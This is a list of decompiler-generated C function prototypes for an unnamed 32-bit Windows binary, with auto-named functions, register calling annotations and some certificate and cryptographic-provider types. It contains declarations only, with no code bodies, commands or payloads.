void __cdecl sub_42FF10(int *a1, int a2);
void *__cdecl sub_42FF30(int a1, void *a2);
char *sub_42FFC0();
int __cdecl sub_42FFE0(void *a1, void *a2, int a3, char *a4, int a5);
int __cdecl sub_4300E0(int a1, int *a2, int a3, int a4, int a5, unsigned int a6, int a7, int a8);
int __cdecl sub_430370(void *a1); // idb
int __cdecl sub_430390(int a1, char *Src, size_t Size);
int __cdecl sub_4303C0(int a1, int a2);
void *sub_4303E0();
void *sub_4303F0();
void __cdecl sub_430410(void *Block);
_DWORD *__cdecl sub_430430(_DWORD *a1);
int __cdecl sub_430450(_BYTE *a1, unsigned __int8 *a2, int a3);
_DWORD *__cdecl sub_430540(_DWORD *a1);
int __cdecl sub_430560(_BYTE *a1, char *a2, int a3);
int __cdecl sub_4306B0(int a1, _BYTE *a2, int *a3);
int __cdecl sub_430700(unsigned __int8 *a1, _BYTE *a2, unsigned int *a3, char *Src, int Size);
int __cdecl sub_430850(int a1, _BYTE *a2, int *a3);
int __cdecl sub_430890(int *a1, _BYTE *a2, _DWORD *a3, unsigned __int8 *a4, int a5);
int __thiscall sub_430A40(void *this);
int __cdecl sub_430AB0(_DWORD *a1, void *a2);
int __cdecl sub_430B10(volatile LONG **a1, char *String2, volatile LONG *MaxCount);
void __cdecl sub_430C20(void **Block);
int __cdecl sub_430C70(unsigned int *a1);
int __cdecl sub_430CC0(unsigned int *a1);
int __cdecl sub_430D50(int a1);
int __cdecl sub_430D80(int a1);
void sub_430DB0();
void *sub_430DE0();
void *sub_430DF0();
void __cdecl sub_430E00(int a1);
_DWORD *__cdecl sub_430E20(_DWORD *Block, __time64_t Time, int a3, int a4);
BOOL __cdecl sub_430EE0(int *a1);
BOOL __cdecl sub_430F10(int a1, int *a2);
int __cdecl sub_430F50(unsigned int *a1, _DWORD *a2);
// size_t __usercall sub_430F90@<eax>(size_t Size@<ecx>, _BYTE *a2@<edi>, int a3, char **a4);
unsigned int __fastcall sub_431090(char *a1, int *a2, char *a3, unsigned int a4);
size_t __cdecl sub_431210(int a1, char **a2);
// int __usercall sub_431240@<eax>(_DWORD *a1@<ecx>, int a2@<ebx>, unsigned int a3@<edi>);
// int __usercall sub_4312B0@<eax>(_BYTE *a1@<ebx>, unsigned __int64 a2);
// int __usercall sub_431300@<eax>(int a1@<ebx>, unsigned int a2@<edi>, int *a3@<esi>, int a4);
int __cdecl sub_431390(int *a1, char **a2, size_t Size);
// int __usercall sub_4314F0@<eax>(unsigned int *a1@<ecx>, int *a2@<esi>, int a3);
// signed int __usercall sub_431560@<eax>(int a1@<esi>, signed __int64 a2, int a3);
int __cdecl sub_431600(_DWORD *a1, unsigned int *a2, int a3);
// _DWORD *__usercall sub_4316A0@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3);
// int __usercall sub_431790@<eax>(int a1@<esi>, int a2, int a3);
int __cdecl sub_431820(_DWORD *a1, unsigned int *a2);
signed int __cdecl sub_431840(int a1, int a2);
int __cdecl sub_431860(unsigned int *a1);
_DWORD *__cdecl sub_4318B0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_4318D0(int a1, int a2);
int __cdecl sub_4318F0(unsigned int *a1);
int __cdecl sub_431960(int a1, int a2);
int __cdecl sub_4319A0(int *a1, int a2);
int __cdecl sub_4319D0(int a1);
BOOL __cdecl sub_4319E0(int a1);
int __cdecl sub_431A00(int *a1, unsigned int a2, int a3);
int __cdecl sub_431A20(int a1, int a2, BOOL *a3, int *a4);
int __cdecl sub_431A30(int a1);
int __cdecl sub_431A40(int a1, unsigned int a2, int a3);
int __cdecl sub_431A50(int a1, int a2);
int __cdecl sub_431A60(int a1, int a2, BOOL *a3, int *a4);
int __cdecl sub_431A70(int a1, int a2, BOOL *a3, int *a4);
// int *__usercall sub_431A80@<eax>(int a1@<ebx>, const char *a2@<edi>);
int __cdecl sub_431B00(signed int **a1, const char *Src);
// int __usercall sub_431C10@<eax>(const char *a1@<edx>, int a2@<edi>, _DWORD *a3, int a4);
int __cdecl sub_431CC0(int a1, int *a2);
void *sub_431D00();
void *sub_431D10();
void __cdecl sub_431D20(int a1);
void *sub_431D40();
void __cdecl sub_431D50(int a1);
void *sub_431D70();
void __cdecl sub_431D80(int a1);
// int __usercall sub_431DA0@<eax>(int *a1@<ebx>, int a2@<edi>, int a3);
// int __usercall sub_431E00@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<esi>);
int __cdecl sub_431E90(int a1, int *a2, int a3, int a4);
int __cdecl sub_431F70(int a1, int *a2, int a3, int a4);
int __cdecl sub_432010(int a1, void *a2);
int __cdecl sub_4320D0(int a1, int a2);
int __cdecl sub_4322A0(int a1, int a2);
int *__cdecl sub_4323E0(int a1, int a2, int *a3);
int __cdecl sub_4325A0(int a1, int a2, int *a3);
// int __usercall sub_432800@<eax>(int a1@<edx>, _DWORD *a2@<ecx>, _BYTE **a3@<ebx>, unsigned int *a4);
int __cdecl sub_432890(_BYTE **a1);
int __cdecl sub_4328B0(int a1, int a2, int a3);
int __cdecl sub_432910(int a1, const char *Src, signed int Size);
int __cdecl sub_4329C0(int a1, int a2, int a3);
_DWORD *__cdecl sub_4329F0(int a1);
void __cdecl sub_432A30(void **Block);
void __cdecl sub_432A70(void *Block);
int __cdecl sub_432AD0(unsigned int *a1, _DWORD *a2);
int __cdecl sub_432B60(int a1);
int __cdecl sub_432B70(_BYTE **a1, unsigned int *a2, int *a3, int *a4, int a5);
int __cdecl sub_432CA0(_BYTE **a1, int a2, int a3, int a4, char a5);
int __cdecl sub_432D70(int a1, int a2);
_DWORD *sub_432DC0();
void **__cdecl sub_432E00(int a1);
int __cdecl sub_432E70(int a1);
int __cdecl sub_432E80(int a1);
int __cdecl sub_432E90(int a1);
int __cdecl sub_432EA0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_432F70(int a1);
int __cdecl sub_432FA0(int a1, int *a2, int a3, int a4, unsigned int a5);
void *sub_433280();
int sub_433290();
void *sub_4332A0();
void *sub_4332B0();
int sub_4332C0();
void __cdecl sub_4332D0(int a1);
void *sub_4332F0();
int sub_433300();
void __cdecl sub_433310(int a1);
void *sub_433330();
int sub_433340();
void __cdecl sub_433350(int a1);
int __cdecl sub_433370(int a1, int *a2, int a3, _DWORD *a4);
int __cdecl sub_4333A0(int a1, int *a2, int a3, _DWORD *a4);
void *sub_4333D0();
int __cdecl sub_4333E0(int a1, int *a2);
void *sub_4334D0();
int __cdecl sub_4334E0(int *a1, void **a2, int a3);
int sub_433500(); // weak
void __cdecl sub_433520(int a1);
int __cdecl sub_433540(int a1, int a2, int a3);
int __cdecl sub_433550(int a1, int a2);
_DWORD *__cdecl sub_433560(_DWORD *a1, _DWORD *a2, int a3);
// int __usercall sub_433580@<eax>(int a1@<esi>);
// int __usercall sub_4335C0@<eax>(_DWORD **a1@<edi>, int *a2);
// volatile LONG **__usercall sub_433650@<eax>(int a1@<ebx>, int a2, int a3);
void *__cdecl sub_433780(_DWORD *a1, void *a2);
// int *__usercall sub_433BF0@<eax>(int a1@<ebx>, int *a2@<edi>, int **a3);
int __cdecl sub_433C90(size_t Size); // idb
int __cdecl sub_433E50(unsigned int a1, int a2, int a3);
int __cdecl sub_433F40(int a1, unsigned int a2, int a3, int a4);
// BOOL __usercall sub_433F60@<eax>(_BYTE **a1@<ebx>, size_t a2@<edi>);
int __cdecl sub_434040(_DWORD *a1, int **a2);
int __cdecl sub_4344E0(_DWORD *a1, int a2, int a3);
_DWORD *__cdecl sub_4345B0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
_DWORD *__cdecl sub_4345E0(int a1, _DWORD *a2);
int __cdecl sub_434600(_DWORD *a1, int a2);
char **sub_4346A0();
void __cdecl sub_4346C0(volatile LONG *Block);
int __cdecl sub_434790(int a1);
int __cdecl sub_4347F0(int a1, int a2, _DWORD *a3, int a4);
int __cdecl sub_434870(_DWORD *a1);
int sub_4349A0();
volatile LONG *__cdecl sub_4349B0(void *a1, volatile LONG **a2, void **a3, int a4);
int __cdecl sub_434AE0(int a1, int a2);
void *sub_434B10();
int __cdecl sub_434B20(int *a1, void **a2, int a3);
void __cdecl sub_434B40(int a1);
int __cdecl sub_434B60(int *a1, int a2, int a3, int a4, int a5, int a6, int a7);
int __cdecl sub_434BD0(_DWORD *a1, int *a2, int *a3, _DWORD *a4, int a5);
int __cdecl sub_434C20(int a1);
int __cdecl sub_434D60(_DWORD *a1, const char *a2, int a3);
void *sub_434DB0();
int __cdecl sub_434DC0(int *a1, void **a2, int a3);
signed int __cdecl sub_434DE0(int a1, void **a2);
void __cdecl sub_434E00(int a1);
_DWORD *__cdecl sub_434E20(_DWORD *a1, _DWORD *a2, _DWORD *a3);
void *sub_434E40();
void *sub_434E50();
BOOL __cdecl sub_434E60(_DWORD *a1);
BOOL __cdecl sub_434E80(_DWORD *a1);
void __cdecl sub_434EA0(void ***a1, int a2);
int __cdecl sub_434EE0(_DWORD **a1, char *a2);
int __cdecl sub_434F40(int *a1, _BYTE *a2, int a3, int a4, int a5, int a6);
int __cdecl sub_434FB0(int *a1, _BYTE *a2, int a3, int a4, int a5, int a6);
int __cdecl sub_434FF0(int a1, _DWORD **a2);
void *sub_435030();
void *sub_435040();
int __cdecl sub_435050(_DWORD *a1, int a2);
int __cdecl sub_435070(_DWORD *a1, int a2);
int __cdecl sub_435080(int *a1, _BYTE *a2, int a3, int a4);
int __cdecl sub_435100(int *a1, char *a2, int a3, int a4, int a5, int a6);
int __cdecl sub_4351A0(int a1, _DWORD *a2);
char **sub_4351C0();
// int __usercall sub_4351D0@<eax>(int a1@<ecx>, __m64 a2@<mm0>, int *Block, void ***a4, unsigned int **a5, void *a6, size_t Size);
// int __usercall sub_4353D0@<eax>(__m64 a1@<mm0>, _BYTE *a2, int a3, _DWORD *a4, int a5);
// int *__usercall sub_4356F0@<eax>(__m64 a1@<mm0>, _BYTE *a2, int Size, int a4);
// int __usercall sub_435930@<eax>(__m64 a1@<mm0>, int a2, int *Block, void ***a4, unsigned int **a5);
int sub_435950();
int __cdecl sub_435960(_DWORD *a1);
int __cdecl sub_435990(_DWORD *a1);
_DWORD *sub_4359C0();
int __cdecl sub_4359D0(int a1, int a2, int a3);
int __cdecl sub_4359E0(int a1, int a2, int a3, int a4);
char **sub_4359F0();
int __cdecl sub_435A00(_DWORD *a1);
size_t __cdecl sub_435B30(void *a1, size_t Size, int a3, int *a4, void (__cdecl *a5)(void *, int *, void *, size_t *));
_DWORD *__cdecl sub_435C30(int a1);
void __cdecl sub_435D10(int a1);
int __cdecl sub_435D30(int a1);
int __cdecl sub_435D40(int a1);
BOOL __cdecl sub_435D80(int a1, _DWORD *a2);
int __cdecl sub_435DC0(int a1, int a2);
int __cdecl sub_435DD0(int a1);
int __cdecl sub_435DE0(int a1, void *Src, size_t Size); // idb
int __cdecl sub_435E60(int a1);
int __cdecl sub_435E90(int a1);
int __cdecl sub_435ED0(int a1);
int __cdecl sub_435F10(int a1);
int __cdecl sub_435F50(int a1);
_DWORD *__cdecl sub_435F90(int *a1);
void __cdecl sub_436040(void *Block);
void __cdecl sub_436070(_BYTE *Block);
int __cdecl sub_4360B0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_436120(int a1, _DWORD *a2);
int __cdecl sub_436180(int a1, _DWORD *a2, int a3, int a4, int a5, int a6);
int __cdecl sub_4361F0(int a1, _DWORD *a2, int a3, int a4, int a5);
int __cdecl sub_436260(int a1, _DWORD *a2, int a3, int a4, int a5);
int __cdecl sub_4362D0(int a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, int a5);
int __cdecl sub_436350(int a1, _DWORD *a2, _DWORD *a3, int a4);
int __cdecl sub_4363C0(int a1, _DWORD *a2, int a3);
int __cdecl sub_436430(int a1, _DWORD *a2);
int __cdecl sub_436490(int a1, _DWORD *a2, int a3);
int __cdecl sub_4364F0(int a1, _DWORD *a2, _DWORD *a3, int a4);
int __cdecl sub_436560(int a1, _DWORD *a2, int a3);
int __cdecl sub_4365C0(int a1, unsigned int a2, int a3, int a4);
int __cdecl sub_436650(int *a1, _DWORD *a2, _DWORD *a3, int a4, int a5, int a6);
int __cdecl sub_4366D0(int a1);
int __cdecl sub_436700(int a1);
int __cdecl sub_436780(int a1);
void __cdecl sub_4367A0(volatile LONG **Block);
void __cdecl sub_436840(volatile LONG **Block);
int __cdecl sub_436900(int a1, int a2);
volatile LONG **__cdecl sub_436AE0(int *a1);
int __cdecl sub_436B20(int a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
int __cdecl sub_436C00(int a1, int a2, int *a3);
int __cdecl sub_436DF0(int a1, _DWORD *a2, int a3, int a4, int a5);
int __cdecl sub_436EA0(int a1, _DWORD *a2, int a3, int a4, int a5);
// int __usercall sub_436F50@<eax>(__m64 a1@<mm0>, int **a2, int **a3, int *a4, int a5, int *a6);
// int __usercall sub_437000@<eax>(__m64 a1@<mm0>, int **a2, int **a3, int *a4, int a5, int *a6);
int __cdecl sub_4370B0(int a1, _DWORD *a2, int a3, _BYTE *a4, unsigned int a5, int *a6);
// int __usercall sub_437160@<eax>(__m64 a1@<mm0>, int **a2, int **a3, _BYTE *a4, int a5, int *a6);
int __cdecl sub_437210(int a1, _DWORD *a2, int a3, _DWORD *a4, int *a5);
int *__cdecl sub_4372A0(int a1, _DWORD *a2, int (*a3)(void));
int *__cdecl sub_4375B0(int a1);
char *__cdecl sub_437640(int a1);
int __cdecl sub_437660(const char *a1);
int __cdecl sub_4376C0(int a1, _BYTE **a2);
size_t *__cdecl sub_437790(size_t **a1, unsigned __int8 **a2, int a3);
int __cdecl sub_4378A0(signed int *a1, int a2, int a3);
BOOL __cdecl sub_4379A0(_DWORD *a1, int a2);
void **__cdecl sub_4379F0(int);
int __cdecl sub_437A00(unsigned int *, _DWORD *);
int __cdecl sub_437A10(int, void *Src, size_t Size); // idb
volatile LONG **sub_437A20();
volatile LONG **sub_437A70();
int __cdecl sub_437AC0(int **a1, int **a2);
int __cdecl sub_437B50(int *a1, int *a2);
int __cdecl sub_437C10(_DWORD *a1, _DWORD *a2, int a3);
int __cdecl sub_437D40(unsigned int **a1, unsigned int **a2, int a3);
int __cdecl sub_437EB0(_DWORD *a1, unsigned int a2);
int __cdecl sub_437F10(_DWORD *a1, unsigned int a2);
int __cdecl sub_437FD0(int *a1, int a2);
int __cdecl sub_438090(int *a1, unsigned int a2);
int __cdecl sub_438150(unsigned int **a1, unsigned int a2);
int __cdecl sub_4381C0(unsigned int *a1, unsigned int *a2, int a3, unsigned int a4);
int __cdecl sub_4384B0(_DWORD *a1, unsigned int *a2, int a3, unsigned int a4);
int __cdecl sub_438670(unsigned __int64 a1, int a2);
int __cdecl sub_4387C0(unsigned int a1, unsigned int a2, unsigned int a3);
unsigned int __cdecl sub_4387D0(int *a1, unsigned int *a2, unsigned int *a3, int a4);
unsigned int __cdecl sub_438990(_DWORD *a1, _DWORD *a2, unsigned int *a3, int a4);
unsigned int __cdecl sub_438B50(_DWORD *a1, _DWORD *a2, unsigned int *a3, int a4, int a5);
_DWORD *__cdecl sub_439100(_DWORD *a1, unsigned int *a2, unsigned int *a3);
_DWORD *__cdecl sub_439550(_DWORD *a1, unsigned int *a2, unsigned int *a3);
unsigned __int64 __cdecl sub_439690(int a1, unsigned int *a2);
unsigned __int64 __cdecl sub_4399C0(int a1, unsigned int *a2);
int __cdecl sub_439AB0(int (__cdecl *a1)(char *, unsigned int, int), int a2, int a3, int a4, signed int Size);
int __cdecl sub_439DC0(int a1, int a2, int a3, signed int Size);
int __cdecl sub_439DF0(int a1, int a2, int a3, int a4, int a5);
int __cdecl sub_439EC0(int a1, int a2, int a3);
void **__cdecl sub_439EE0(int a1);
int __cdecl sub_439FC0(int a1, int a2);
_BYTE *__cdecl sub_43A050(_DWORD *a1);
int __cdecl sub_43A270(void ***a1, _BYTE *a2);
int __cdecl sub_43A420(void ***a1, char *a2);
int __cdecl sub_43A5A0(void ***a1, char *a2);
int __cdecl sub_43A610(int a1, _DWORD *a2);
void **__cdecl sub_43A6D0(int a1, int a2, void ***a3);
int __cdecl sub_43A800(int *a1, _DWORD *a2, int a3);
BOOL sub_43AEB0();
int sub_43B000();
int sub_43B820();
int __cdecl sub_43B920(char *a1);
void sub_43B960();
int __cdecl sub_43B970(int a1, void *Src); // idb
int __cdecl sub_43B9E0(int a1, int a2, __m64 *a3, int a4);
int sub_43BA10();
int sub_43BAA0();
// int __usercall sub_43BB30@<eax>(_DWORD *a1@<esi>);
int __cdecl sub_43BBC0(int a1, int *a2, _DWORD *a3, int a4);
int sub_43BC10();
// int __usercall sub_43BCC0@<eax>(_DWORD *a1@<esi>);
int __cdecl sub_43BD30(int a1, int *a2, _DWORD *a3, int a4);
volatile LONG *__cdecl sub_43BD70(int a1, LPCCH lpMultiByteStr);
int sub_43BDC0(); // weak
// BOOL __usercall sub_43BE10@<eax>(_DWORD *a1@<esi>);
volatile LONG *sub_43BF00();
int __cdecl sub_43BF40(int *a1, int Src);
// BOOL __usercall sub_43BFA0@<eax>(_DWORD *a1@<esi>);
void sub_43C010();
void __cdecl sub_43C050(void *Block);
void __cdecl sub_43C070(int a1, void *Block);
// int __usercall sub_43C0D0@<eax>(int a1@<ebx>, int *a2);
int __thiscall sub_43C1E0(void *this);
int sub_43C2A0();
// int __usercall sub_43C2B0@<eax>(int a1@<esi>);
// int __usercall sub_43C380@<eax>(int a1@<ebx>, _DWORD *a2);
int __cdecl sub_43C580(_DWORD *a1, int a2, unsigned int a3, const char *Src);
volatile LONG *sub_43C800();
volatile LONG *sub_43C8A0();
BOOL sub_43C8D0();
void __cdecl sub_43C8F0(int a1, char *a2, char *a3, char a4);
void __cdecl sub_43C930(int C, char *a2, char *a3, char a4);
int sub_43C9B0(); // weak
int __cdecl sub_43CBA0(int C, char *a2, _BYTE *a3, int a4);
void __cdecl sub_43CD00(int a1, int a2, char a3, _DWORD *a4, _DWORD *a5);
int __cdecl sub_43CD40(int C, _BYTE *a2, _BYTE *a3, int a4);
int __cdecl sub_43CDC0(int a1, _DWORD *a2, int a3, int a4);
int __cdecl sub_43CF50(_BYTE *a1, int a2);
int sub_43CFF0();
int sub_43D0E0();
int sub_43D1D0();
int sub_43D2C0();
int sub_43D3B0();
int sub_43D4A0();
int sub_43D590();
int sub_43D680();
int sub_43D770();
int sub_43D860();
int sub_43D950();
int sub_43DA40();
int sub_43DB30();
int sub_43DC20();
int sub_43DD10();
int __cdecl sub_43DE00(int a1, int *a2, _DWORD *a3, int a4);
// BOOL __usercall sub_43DF60@<eax>(_DWORD *a1@<esi>);
volatile LONG *sub_43E020();
int sub_43E060();
int __cdecl sub_43E0B0(__int16 a1, __int16 a2, int a3, int a4);
int sub_43E0F0();
// BOOL __usercall sub_43E160@<eax>(_BYTE *a1@<edi>, int a2, int a3);
int sub_43E1B0();
const CHAR *__cdecl sub_43E1E0(const CHAR *a1, int a2, char *a3, int *a4);
// const CHAR *__usercall sub_43E250@<eax>(const CHAR *a1@<edx>, char *a2, ...);
void __cdecl sub_43E270(int a1);
CHAR *__cdecl sub_43E2C0(LPCWCH lpWideCharStr);
// int __usercall sub_43E3D0@<eax>(DWORD a1@<ecx>, DWORD *a2@<ebx>, const CHAR *a3, const char **a4);
int __cdecl sub_43E550(const CHAR *a1, int a2);
// void __usercall sub_43E600(int a1@<esi>, int a2);
void __cdecl sub_43E690(PCCERT_CONTEXT *Block);
// void __usercall sub_43E6E0(int a1@<esi>);
// int __usercall sub_43E760@<eax>(int *a1@<edi>, int a2);
int __cdecl sub_43E7D0(int a1);
int __cdecl sub_43E810(int a1);
int __cdecl sub_43E880(int a1);
int __cdecl sub_43E8F0(int a1, int a2);
// BOOL __usercall sub_43EBC0@<eax>(const CERT_CONTEXT *a1@<edi>);
BOOL __fastcall sub_43ECA0(const CERT_CONTEXT *a1, const CHAR *a2);
void __fastcall sub_43ED80(const CERT_CONTEXT *a1, int a2, int a3);
// HCERTSTORE __usercall sub_43EED0@<eax>(const char *pvPara@<ecx>, int a2@<edi>);
PCCERT_CONTEXT __cdecl sub_43EF50(int a1, void *pvFindPara, HCERTSTORE hCertStore);
HCRYPTPROV *__cdecl sub_43F010(int a1, const char *szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwKeySpec);
// HCRYPTPROV *__usercall sub_43F1D0@<eax>(const CERT_CONTEXT *a1@<edi>, int a2);
HCRYPTPROV *__cdecl sub_43F240(int a1, CHAR *lpMultiByteStr);
_DWORD *sub_43F390();
// int __usercall sub_43F400@<eax>(const char *a1@<ebx>, const CHAR *a2, DWORD dwProvType, int a4);
int __fastcall sub_43F580(DWORD a1, const CHAR *a2);
_DWORD *__cdecl sub_43F5E0(_DWORD *a1);
HCRYPTPROV *__cdecl sub_43FA90(_DWORD *a1, CHAR *lpMultiByteStr);
int __cdecl sub_43FB10(int a1, BYTE *pbData, int a3, BYTE *pbSignature, DWORD *a5, int a6);
int __cdecl sub_43FDF0(int Size, int a2, void *a3, int a4, int a5);
_DWORD **__cdecl sub_440030(BYTE *pbData, int a2, int a3);
int __cdecl sub_440280(int a1, int a2, void *pvFindPara); // idb
int __cdecl sub_440380(_DWORD *a1, int a2, int *a3, int *a4, _DWORD *a5);
int __cdecl sub_4405D0(int a1, int a2, int a3, void *Src); // idb
int sub_4409D0(); // weak
// int __usercall sub_440C40@<eax>(_DWORD *a1@<esi>);
volatile LONG *sub_440DB0();
void **__cdecl sub_440DF0(void *a1, const char *Src, void *a3, void *a4);
int __cdecl sub_440EC0(char *Str); // idb
int __cdecl sub_440F50(const char *Src, const char *a2, int a3);
BOOL __cdecl sub_441080(const char *Src, void *a2, void *a3);
char *sub_4410A0();
int __cdecl sub_441130(char *Str, int Val, int a3, int (__cdecl *a4)(char *, int, int), int a5);
void **__cdecl sub_441220(const char *Src, const char *a2);
void sub_4412F0();
// int __usercall sub_4413A0@<eax>(const char *a1@<edi>, const char *a2@<esi>, int a3, char a4);
void __cdecl sub_4414A0(int a1);
void sub_441560();
int __cdecl sub_441570(int a1, char *VarName, char a3);
int __cdecl sub_441630(char *a1, char *a2, char a3);
int nullsub_1(void); // weak
BOOL __cdecl sub_4416E0(int *a1, __int16 a2);
int __cdecl sub_4417B0(char *Str1, size_t MaxCount, _DWORD *a3);
BOOL __cdecl sub_441950(int *a1, char *Str);
int sub_4419D0();
unsigned int __cdecl sub_441A30(int *a1, unsigned int *a2, int a3, unsigned int *a4);
unsigned int __cdecl sub_441AF0(int *a1, unsigned int *a2, int a3, unsigned int *a4);
int __cdecl sub_441C90(int *a1, int *a2, int *a3);
int __cdecl sub_441E30(_DWORD *a1);
void __cdecl sub_441E60(void **Block);
int __cdecl sub_441EA0(_DWORD *a1, _DWORD *a2);
int __cdecl sub_441EF0(_DWORD *a1, int *a2, int a3, int *a4);
int __cdecl sub_441F50(int *a1, _DWORD *a2, unsigned int **a3, int *a4, int *a5);
int __cdecl sub_4421B0(_DWORD *a1, int *a2, unsigned int **a3, int *a4, int *a5);
int __cdecl sub_442240(__m64 a1, int a2, __int64 a3, int a4);
int sub_442860();
int __cdecl sub_442870(int *a1);
_DWORD *__cdecl sub_4428C0(int a1);
void __cdecl sub_4428E0(int a1);
int __cdecl sub_442950(int a1, int *a2, int a3, int a4);
int __cdecl sub_442A00(int *a1, int a2, int a3);
int __cdecl sub_442AC0(int a1, int a2);
int sub_442B10();
int __cdecl sub_442B20(int *a1);
int __cdecl sub_442B70(int *a1);
_DWORD *__cdecl sub_442BC0(int a1);
void __cdecl sub_442BE0(int a1);
int __cdecl sub_442C50(int a1, int a2);
int __cdecl sub_442D40(_DWORD *a1);
int __cdecl sub_442DE0(_BYTE *a1, int *a2);
int __cdecl sub_443280(int a1, char *Src, size_t Size);
BOOL __cdecl sub_443370(_DWORD *a1);
// int __usercall sub_443390@<eax>(_DWORD *a1@<ecx>, const char *a2@<edi>);
unsigned int __fastcall sub_4433F0(const char *a1, int a2, int a3, unsigned int a4);
unsigned int __cdecl sub_443620(int a1, int a2, unsigned int a3, const char *a4, int a5);
BOOL __cdecl sub_443730(int a1, unsigned int a2);
BOOL __cdecl sub_443780(char *EndPtr, const char *a2, char *String, int a4);
int sub_443940(); // weak
int __cdecl sub_443960(int a1);
void __cdecl sub_4439E0(void *Block);
void __cdecl sub_443A10(volatile LONG **Block);
int __cdecl sub_443A60(int a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_443B50(int a1, int a2, const char *a3);
void *__cdecl sub_443B90(int a1, int a2, const char *a3);
// volatile LONG **__usercall sub_443C00@<eax>(int a1@<ecx>, int a2@<ebx>, volatile LONG *a3);
volatile LONG **__cdecl sub_443D20(int a1, volatile LONG *a2);
volatile LONG **__cdecl sub_443E40(int a1, volatile LONG *a2);
volatile LONG **__cdecl sub_443E60(volatile LONG **a1);
int sub_443F30(); // weak
int __cdecl sub_443F40(int *a1);
int __cdecl sub_443F90(int *a1);
_DWORD *__cdecl sub_443FE0(int a1);
int __cdecl sub_444000(int a1, int a2);
int __cdecl sub_444020(int a1, int a2);
int __cdecl sub_444070(int a1, const __m128i *Src, size_t Size);
int __cdecl sub_444150(_BYTE *a1, int *a2);
int __cdecl sub_444360(_DWORD *a1, char *Src, size_t Size);
int __cdecl sub_444440(_BYTE *a1, int *a2);
_DWORD *sub_444720();
BOOL __cdecl sub_444750(int a1, int a2, int a3);
// int __usercall sub_444780@<eax>(_BYTE *a1@<edx>, unsigned __int8 a2@<bl>, int a3@<edi>, int (__cdecl *a4)(int, char *, int)@<esi>, unsigned int a5);
int __fastcall sub_444940(_BYTE *a1, int (__cdecl *a2)(int, char *, int), int a3, int a4, char a5, char a6, int a7);
// int __usercall sub_444B30@<eax>(_BYTE *a1@<ecx>, int a2@<edi>, int (__cdecl *a3)(int, char *, int), int a4);
int __fastcall sub_444BA0(int a1, int a2, __int16 a3, int (__cdecl *a4)(int, char *, int));
// int __usercall sub_444C80@<eax>(__int16 a1@<cx>, int (__cdecl *a2)(int, char *, int)@<edi>, int a3, int *a4);
// int __usercall sub_444E10@<eax>(int a1@<ebx>, int a2@<edi>, int (__cdecl *a3)(int, const char *, int));
int __cdecl sub_444E50(int (__cdecl *a1)(int, const char *, int), int *a2, int a3, int a4);
int __cdecl sub_445220(int a1, int *a2, int a3, int a4);
int __cdecl sub_445260(_DWORD *a1, signed int *a2);
char *__cdecl sub_4452F0(int *a1, char *Destination, int a3);
int __cdecl sub_4456B0(_DWORD *a1, int a2);
int __cdecl sub_4456D0(_DWORD *a1, int a2, int a3);
int __cdecl sub_4456F0(_DWORD *a1, LONG Value, int a3);
_DWORD *__cdecl sub_445790(_DWORD *a1, int a2);
void __cdecl sub_4457D0(_DWORD *a1, int a2);
int __cdecl sub_445820(_DWORD *a1, void *Src, size_t Size, int a4);
int __cdecl sub_4458B0(_DWORD *a1, void **a2, _DWORD *a3, int a4);
int __cdecl sub_445920(_DWORD *a1, int a2);
_DWORD *__cdecl sub_445930(_DWORD *a1, int a2, int a3);
void __cdecl sub_4459F0(void **Block);
void __cdecl sub_445A60(void *Block);
// _DWORD *__usercall sub_445AA0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4, int a5);
// int __usercall sub_445B20@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4, int a5, int a6, void *a7, void *a8, void *a9);
int __cdecl sub_445BA0(int a1, int a2, int a3, int a4, void *a5, void *a6);
int __cdecl sub_445BE0(int a1, int a2, int a3, int a4, void *a5, void *a6, void *a7);
int __cdecl sub_445C20(int a1, int a2, int *a3);
int __cdecl sub_445C90(int a1);
int __cdecl sub_445DB0(int a1);
int __cdecl sub_445DC0(int a1);
int __cdecl sub_445DD0(int a1);
int __cdecl sub_445DE0(_DWORD *a1);
int __cdecl sub_445E00(_DWORD *a1);
int __cdecl sub_445E20(_DWORD *a1);
int __cdecl sub_445E40(int a1, int a2, const char *a3);
int **__cdecl sub_446040(char **a1);
int **sub_4460F0();
int __fastcall sub_446100(int a1, const void *a2, int a3, _DWORD *a4, size_t Size);
int __cdecl sub_446280(int *a1, int a2);
int __cdecl sub_446340(int a1, int a2);
int __cdecl sub_446390(int a1, int a2);
int __cdecl sub_4463C0(int a1, int a2);
int __cdecl sub_446460(int *a1, _DWORD *Block);
int sub_446570();
int sub_446580();
void __cdecl sub_446590(int a1);
// BOOL __usercall sub_4465D0@<eax>(int a1@<ecx>, int a2@<edi>, int a3, int a4);
BOOL __cdecl sub_4466C0(int a1, int a2, int a3);
BOOL __cdecl sub_4466E0(int a1, int a2, int a3);
int __cdecl sub_446770(int a1, int a2, int a3, _DWORD *Src);
int __cdecl sub_446850(int a1, int a2);
int __cdecl sub_446930(int a1, _BYTE *a2, _DWORD *a3);
int __cdecl sub_4469F0(int a1, int a2);
void __cdecl sub_446A00(volatile LONG **Block);
int __cdecl sub_446A10(int a1, int a2);
int __cdecl sub_446B50(int *a1, int a2);
int __cdecl sub_446C50(int a1, int a2);
int __cdecl sub_446D90(int *a1, int a2);
int __cdecl sub_446EB0(int a1, void **a2, int a3);
signed int __cdecl sub_446F20(int a1, void **a2);
// int __usercall sub_446F50@<eax>(int a1@<ebx>, int a2@<edi>, int a3, void *Block);
int __cdecl sub_447220(int a1);
int __cdecl sub_447230(int a1);
int __cdecl sub_447250(int a1);
BOOL __cdecl sub_447260(int a1, int a2);
// void **__usercall sub_4472D0@<eax>(void ***a1@<edi>, int a2);
// int __usercall sub_447300@<eax>(_DWORD *a1@<ebx>, int a2@<esi>, int a3);
volatile LONG *__cdecl sub_447400(_DWORD *a1);
int __cdecl sub_447440(int a1, int a2);
BOOL __cdecl sub_447480(int a1);
BOOL __cdecl sub_4474A0(int a1, int a2);
